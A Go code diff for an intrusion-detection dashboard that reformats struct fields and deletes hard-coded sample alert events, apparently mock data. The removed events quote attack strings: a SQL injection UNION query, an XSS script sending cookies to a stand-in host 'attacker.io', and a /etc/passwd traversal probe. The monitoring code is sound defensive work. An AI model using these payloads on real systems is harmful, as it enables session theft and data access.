@@ -19,19 +19,19 @@ import (
 // ── IDS Event store ────────────────────────────────────────────
 
 type IDSEvent struct {
-	ID          string
-	Severity    string // "critical" | "high" | "medium" | "low" | "info"
-	EventType   string
-	SourceIP    string
-	Target      string
-	Protocol    string
-	Action      string
-	Status      string // "open" | "reviewing" | "acknowledged" | "mitigated" | "suppressed"
-	RuleID      string
-	Details     string
-	TimeLabel   string
-	Created     string
-	Updated     string
+	ID        string
+	Severity  string // "critical" | "high" | "medium" | "low" | "info"
+	EventType string
+	SourceIP  string
+	Target    string
+	Protocol  string
+	Action    string
+	Status    string // "open" | "reviewing" | "acknowledged" | "mitigated" | "suppressed"
+	RuleID    string
+	Details   string
+	TimeLabel string
+	Created   string
+	Updated   string
 }
 
 type idsEventStoreType struct {
@@ -40,23 +40,7 @@ type idsEventStoreType struct {
 }
 
 var idsEventStore = &idsEventStoreType{
-	events: map[string][]IDSEvent{
-		"buyvm": {
-			{ID: newID(), Severity: "critical", EventType: "SQL Injection Attempt", SourceIP: "203.0.113.42", Target: "api.buyvm.net/graphql", Protocol: "HTTPS", Action: "blocked", Status: "open", RuleID: "SQLI-942100", Details: "GET /graphql?query=1' UNION SELECT null,null,null FROM information_schema.tables--", TimeLabel: "14:38:12", Created: "2026-04-17T14:38:12Z", Updated: "2026-04-17T14:38:12Z"},
-			{ID: newID(), Severity: "critical", EventType: "Brute Force — SSH", SourceIP: "198.51.100.88", Target: "ssh.infra (port 22)", Protocol: "SSH", Action: "alerted", Status: "open", RuleID: "BRUTE-SSH-001", Details: "412 login attempts in 4 minutes targeting: root, admin, deploy", TimeLabel: "14:21:44", Created: "2026-04-17T14:21:44Z", Updated: "2026-04-17T14:21:44Z"},
-			{ID: newID(), Severity: "high", EventType: "Port Scan Detected", SourceIP: "192.0.2.17", Target: "10.0.0.0/24 subnet", Protocol: "TCP", Action: "alerted", Status: "reviewing", RuleID: "SCAN-NMAP-002", Details: "Scanned ports: 22, 80, 443, 3306, 5432, 6379, 8080, 8443 over 18s from AS16509 Amazon EC2", TimeLabel: "13:58:09", Created: "2026-04-17T13:58:09Z", Updated: "2026-04-17T13:58:09Z"},
-			{ID: newID(), Severity: "medium", EventType: "XSS Attempt", SourceIP: "10.12.88.4", Target: "app.buyvm.net/search", Protocol: "HTTPS", Action: "blocked", Status: "mitigated", RuleID: "XSS-941100", Details: "q=<script>document.location='https://attacker.io/?c='+document.cookie</script>", TimeLabel: "13:44:51", Created: "2026-04-17T13:44:51Z", Updated: "2026-04-17T13:44:51Z"},
-			{ID: newID(), Severity: "medium", EventType: "Unusual Auth Volume", SourceIP: "185.220.101.3", Target: "auth.buyvm.net", Protocol: "HTTPS", Action: "alerted", Status: "open", RuleID: "AUTH-SPAM-003", Details: "84 login attempts per 5 minutes from Tor exit node AS396356", TimeLabel: "13:12:28", Created: "2026-04-17T13:12:28Z", Updated: "2026-04-17T13:12:28Z"},
-			{ID: newID(), Severity: "low", EventType: "Path Traversal Probe", SourceIP: "204.15.9.34", Target: "cdn.buyvm.net", Protocol: "HTTPS", Action: "logged", Status: "suppressed", RuleID: "LFI-930100", Details: "Path: /../../../etc/passwd — CDN rule: log only", TimeLabel: "12:55:03", Created: "2026-04-17T12:55:03Z", Updated: "2026-04-17T12:55:03Z"},
-		},
-		"abrnoc": {
-			{ID: newID(), Severity: "high", EventType: "Port Scan Detected", SourceIP: "91.108.4.200", Target: "93.115.20.0/24", Protocol: "TCP", Action: "blocked", Status: "open", RuleID: "SCAN-NMAP-002", Details: "Systematic port sweep on range", TimeLabel: "11:04:00", Created: "2026-04-17T11:04:00Z", Updated: "2026-04-17T11:04:00Z"},
-		},
-		"hosting": {
-			{ID: newID(), Severity: "critical", EventType: "SQL Injection Attempt", SourceIP: "45.155.205.10", Target: "api.hosting.io/v2/query", Protocol: "HTTPS", Action: "blocked", Status: "open", RuleID: "SQLI-942100", Details: "UNION-based injection targeting user table", TimeLabel: "09:47:31", Created: "2026-04-17T09:47:31Z", Updated: "2026-04-17T09:47:31Z"},
-			{ID: newID(), Severity: "medium", EventType: "Unusual Auth Volume", SourceIP: "192.168.10.5", Target: "auth.hosting.io", Protocol: "HTTPS", Action: "alerted", Status: "reviewing", RuleID: "AUTH-SPAM-003", Details: "60 login attempts per 3 minutes from internal range", TimeLabel: "08:30:00", Created: "2026-04-17T08:30:00Z", Updated: "2026-04-17T08:30:00Z"},
-		},
-	},
+	events: map[string][]IDSEvent{},
 }
 
 func (s *idsEventStoreType) list(slug string) []IDSEvent {
@@ -151,11 +135,11 @@ func dbIDSEventToLocal(e db.IDSEvent) IDSEvent {
 // ── Page data ─────────────────────────────────────────────────
 
 type idsInnerData struct {
-	Events          []IDSEvent
-	TenantSlug      string
-	Search          string
-	SeverityFilter  string
-	StatusFilter    string
+	Events         []IDSEvent
+	TenantSlug     string
+	Search         string
+	SeverityFilter string
+	StatusFilter   string
 }
 
 func renderIDSPage(w http.ResponseWriter, r *http.Request, tenant Tenant, user User, d idsInnerData) {
